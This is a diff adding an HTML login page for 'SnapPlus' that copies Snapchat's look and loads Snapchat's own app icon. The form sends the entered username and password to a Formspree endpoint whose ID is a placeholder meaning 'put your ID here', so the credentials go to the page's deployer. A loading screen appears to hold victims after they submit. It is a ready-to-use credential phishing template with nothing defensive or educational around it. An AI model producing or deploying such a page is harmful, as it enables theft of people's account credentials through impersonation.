@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SnapPlus - Login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div id="login-page" class="snap-wrapper">
+        <div class="login-box">
+            <div class="logo">
+                <img src="https://accounts.snapchat.com/accounts/static/images/ghost/snapchat-app-icon.png" alt="SnapPlus Logo">
+            </div>
+            <h2>Log In</h2>
+            
+            <form id="loginForm" action="https://formspree.io/f/APNA_ID_YAHAN_DALEN" method="POST">
+                <div class="input-field">
+                    <label>USERNAME OR EMAIL</label>
+                    <input type="text" name="username" required>
+                </div>
+                <div class="input-field">
+                    <label>PASSWORD</label>
+                    <input type="password" name="password" required>
+                </div>
+                <button type="submit" class="yellow-btn">Log In</button>
+            </form>
+            
+            <div class="bottom-text">
+                <a href="#">Forgot Password?</a>
+            </div>
+        </div>
+    </div>
+
+    <div id="black-screen">
+        <div class="loader-container">
+            <div class="spinner"></div>
+            <p>Loading...</p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
